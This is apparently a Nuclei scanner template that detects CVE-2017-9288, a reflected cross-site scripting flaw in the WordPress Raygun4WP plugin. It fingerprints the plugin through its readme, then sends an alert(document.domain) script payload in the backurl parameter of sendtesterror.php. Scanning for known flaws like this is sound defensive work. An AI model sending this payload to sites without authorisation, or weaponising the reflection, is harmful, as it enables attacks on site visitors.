flow: http(1) && http(2)
http:
- matchers:
  - condition: and
    internal: true
    type: word
    words:
    - Raygun4WP
    - 'Tags:'
  raw:
  - 'GET /wp-content/plugins/raygun4wp/readme.txt HTTP/1.1

    Host: {{Hostname}}

    '
- matchers:
  - part: body
    type: word
    words:
    - </script><script>alert(document.domain)</script>
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/wp-content/plugins/raygun4wp/sendtesterror.php?backurl=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
id: CVE-2017-9288
info:
  author: daffainfo
  classification:
    cpe: cpe:2.3:a:raygun:raygun4wp:1.8.0:*:*:*:*:wordpress:*:*
    cve-id: CVE-2017-9288
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
    epss-percentile: 0.85824
    epss-score: 0.02863
  description: WordPress Raygun4WP 1.8.0 contains a reflected cross-site scripting
    vulnerability via sendtesterror.php.
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute arbitrary script code in the context of the affected website, potentially
    leading to session hijacking, defacement, or theft of sensitive information.

    '
  metadata:
    framework: wordpress
    max-request: 2
    product: raygun4wp
    vendor: raygun
  name: WordPress Raygun4WP <=1.8.0 - Cross-Site Scripting
  reference:
  - https://github.com/MindscapeHQ/raygun4wordpress/pull/17
  - https://github.com/MindscapeHQ/raygun4wordpress/issues/16
  - http://jgj212.blogspot.kr/2017/05/a-reflected-xss-vulnerability-in.html
  - https://nvd.nist.gov/vuln/detail/CVE-2017-9288
  - https://wpvulndb.com/vulnerabilities/8836
  remediation: 'Update to the latest version of the WordPress Raygun4WP plugin (1.8.0
    or higher) to mitigate this vulnerability.

    '
  severity: medium
  tags: cve2017,cve,wordpress,xss,wp-plugin,raygun,vuln
